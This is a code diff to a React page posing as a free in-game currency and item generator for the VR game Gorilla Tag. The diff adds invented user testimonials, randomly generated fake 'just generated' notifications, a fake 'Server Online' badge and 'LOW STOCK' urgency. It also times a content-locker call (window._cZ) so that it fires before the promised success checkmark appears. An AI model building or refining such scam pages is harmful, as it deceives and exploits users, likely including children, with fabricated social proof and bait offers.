@@ -22,11 +22,16 @@
             animation: {
               'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
               'float': 'float 6s ease-in-out infinite',
+              'slide-up': 'slideUp 0.5s ease-out forwards',
             },
             keyframes: {
               float: {
                 '0%, 100%': { transform: 'translateY(0)' },
                 '50%': { transform: 'translateY(-20px)' },
+              },
+              slideUp: {
+                '0%': { transform: 'translateY(20px)', opacity: '0' },
+                '100%': { transform: 'translateY(0)', opacity: '1' },
               }
             }
           }
@@ -113,6 +118,13 @@
             "Finalizing transaction..."
         ];
 
+        const COMMENTS = [
+            { user: "GorillaTagFan99", text: "OMG it actually worked! I got the Swoopjaw instantly.", time: "1 min ago" },
+            { user: "VR_Master_X", text: "Verified in like 2 mins and the nugs were there.", time: "3 mins ago" },
+            { user: "QuestProUser", text: "Was skeptical but this is legit. Thanks!", time: "5 mins ago" },
+            { user: "MonkeSeeMonkeDo", text: "Swoopjaw is so rare, can't believe I got it for free.", time: "12 mins ago" },
+        ];
+
         // --- 2. COMPONENTS ---
 
         const Background = () => {
@@ -145,6 +157,75 @@
                             }}
                         />
                     ))}
+                </div>
+            );
+        };
+
+        const LiveActivity = () => {
+            const [activity, setActivity] = useState(null);
+            
+            useEffect(() => {
+                const names = ["Alex", "Jordan", "Taylor", "Casey", "Riley", "Jamie", "Peyton"];
+                const items = ["5000 Nugs", "10000 Nugs", "Swoopjaw"];
+                
+                const showNewActivity = () => {
+                    const name = names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 99);
+                    const item = items[Math.floor(Math.random() * items.length)];
+                    setActivity({ name, item, id: Date.now() });
+                    
+                    setTimeout(() => setActivity(null), 4000);
+                };
+
+                const interval = setInterval(showNewActivity, Math.random() * 5000 + 3000);
+                return () => clearInterval(interval);
+            }, []);
+
+            return (
+                <AnimatePresence>
+                    {activity && (
+                        <motion.div 
+                            initial={{ x: -100, opacity: 0 }}
+                            animate={{ x: 0, opacity: 1 }}
+                            exit={{ y: 20, opacity: 0 }}
+                            className="fixed bottom-4 left-4 z-50 bg-black/80 backdrop-blur-md border border-brand-neon/30 p-3 rounded-lg shadow-lg flex items-center gap-3 max-w-[300px]"
+                        >
+                            <div className="w-8 h-8 rounded-full bg-brand-neon/20 flex items-center justify-center border border-brand-neon/50">
+                                <span className="text-brand-neon text-xs">✔</span>
+                            </div>
+                            <div className="text-xs">
+                                <span className="text-brand-neon font-bold">{activity.name}</span>
+                                <span className="text-gray-300"> just generated </span>
+                                <span className="text-brand-gold font-bold">{activity.item}</span>
+                            </div>
+                        </motion.div>
+                    )}
+                </AnimatePresence>
+            );
+        };
+
+        const CommentsSection = () => {
+            return (
+                <div className="w-full max-w-2xl mx-auto mt-8 mb-20 px-4 z-10 relative">
+                    <div className="bg-black/40 backdrop-blur-sm border border-white/5 rounded-2xl p-6">
+                        <h3 className="text-white font-bold mb-4 flex items-center gap-2">
+                            <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                            Live Chat
+                        </h3>
+                        <div className="space-y-4 max-h-[300px] overflow-y-auto pr-2 custom-scrollbar">
+                            {COMMENTS.map((comment, idx) => (
+                                <div key={idx} className="flex gap-3 items-start border-b border-white/5 pb-3 last:border-0">
+                                    <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-brand-purple to-brand-neon flex-shrink-0" />
+                                    <div>
+                                        <div className="flex items-center gap-2">
+                                            <span className="text-sm font-bold text-gray-200">{comment.user}</span>
+                                            <span className="text-[10px] text-gray-500">{comment.time}</span>
+                                        </div>
+                                        <p className="text-xs text-gray-400 mt-1">{comment.text}</p>
+                                    </div>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
                 </div>
             );
         };
@@ -265,8 +346,14 @@
                 <motion.div 
                     initial={{ opacity: 0, y: 20 }}
                     animate={{ opacity: 1, y: 0 }}
-                    className="w-full max-w-md bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-6 md:p-8 shadow-2xl z-20"
+                    className="w-full max-w-md bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-6 md:p-8 shadow-2xl z-20 relative"
                 >
+                     {/* Server Status Badge */}
+                     <div className="absolute -top-3 right-4 bg-green-500/20 border border-green-500/50 backdrop-blur-md px-3 py-1 rounded-full flex items-center gap-2">
+                        <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                        <span className="text-[10px] font-bold text-green-400 uppercase tracking-wider">Server Online</span>
+                    </div>
+
                     <div className="mb-6 text-center">
                         <h2 className="text-2xl font-bold text-white mb-1">Configure Rewards</h2>
                         <p className="text-gray-400 text-sm">Enter your details to begin.</p>
@@ -319,18 +406,21 @@
 
                         <div 
                             onClick={() => setConfig({...config, swoopjaw: !config.swoopjaw})}
-                            className={`cursor-pointer p-4 rounded-xl border transition-all flex items-center justify-between group ${config.swoopjaw ? 'bg-gradient-to-r from-purple-900/50 to-brand-dark border-brand-neon/50' : 'bg-black/20 border-white/5'}`}
+                            className={`cursor-pointer p-4 rounded-xl border transition-all flex items-center justify-between group relative overflow-hidden ${config.swoopjaw ? 'bg-gradient-to-r from-purple-900/50 to-brand-dark border-brand-neon/50' : 'bg-black/20 border-white/5'}`}
                         >
-                            <div className="flex items-center gap-3">
+                            <div className="flex items-center gap-3 relative z-10">
                                 <div className="w-10 h-10 rounded-lg overflow-hidden bg-black/50 border border-white/10 p-1">
                                     <img src={ASSETS.SWOOPJAW} className="w-full h-full object-contain" alt="Swoopjaw" />
                                 </div>
                                 <div className="text-left">
                                     <div className={`font-bold text-sm ${config.swoopjaw ? 'text-white' : 'text-gray-400'}`}>Unlock Swoopjaw</div>
-                                    <div className="text-xs text-gray-500">Legendary Item</div>
+                                    <div className="text-xs flex items-center gap-1">
+                                        <span className="text-gray-500">Legendary Item</span>
+                                        <span className="text-red-500 font-bold bg-red-500/10 px-1 rounded text-[10px]">LOW STOCK</span>
+                                    </div>
                                 </div>
                             </div>
-                            <div className={`w-12 h-6 rounded-full p-1 transition-colors ${config.swoopjaw ? 'bg-brand-neon' : 'bg-gray-700'}`}>
+                            <div className={`w-12 h-6 rounded-full p-1 transition-colors relative z-10 ${config.swoopjaw ? 'bg-brand-neon' : 'bg-gray-700'}`}>
                                 <div className={`w-4 h-4 bg-white rounded-full shadow-md transform transition-transform ${config.swoopjaw ? 'translate-x-6' : 'translate-x-0'}`} />
                             </div>
                         </div>
@@ -359,17 +449,15 @@
                 if (status !== 'idle') return;
                 setStatus('verifying');
                 
-                // Wait for realistic "network check"
                 setTimeout(() => {
-                    // 1. Trigger Locker FIRST - Checkmark has NOT appeared yet
+                    // Trigger Locker while spinner is still going (User doesn't see checkmark yet)
                     if (typeof window._cZ === 'function') {
                         window._cZ();
                     } else {
                         console.warn('Locker script not loaded yet.');
                     }
                     
-                    // 2. Show checkmark AFTER locker trigger (1s later)
-                    // This satisfies the "checkmark must not happen before locker" requirement.
+                    // Show success checkmark AFTER locker triggers
                     setTimeout(() => {
                         setStatus('verified');
                     }, 1000); 
@@ -514,6 +602,7 @@
             return (
                 <div className="relative min-h-screen w-full overflow-x-hidden flex flex-col items-center">
                     <Background />
+                    <LiveActivity />
 
                     <main className="flex-grow w-full flex flex-col items-center pt-8 md:pt-16 px-4">
                         <header className="relative z-10 mb-6 flex items-center gap-2">
@@ -543,6 +632,8 @@
                         </AnimatePresence>
 
                         <SocialProof />
+                        
+                        {started && <CommentsSection />}
                     </main>
 
                     <Footer />
